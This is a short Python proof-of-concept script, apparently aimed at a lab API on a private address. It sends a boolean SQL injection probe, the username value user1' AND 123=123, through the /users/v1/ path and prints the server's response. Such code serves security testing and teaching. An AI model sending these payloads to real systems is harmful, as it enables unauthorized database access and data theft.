import requests

def sqli(url):
    username = "user1' AND 123=123"

    r = requests.get(url + "/users/v1/" + username)
    print(r.text)


def main():
    url = 'http://172.16.54.128:5000'
    sqli(url)

if __name__ == '__main__':
    main()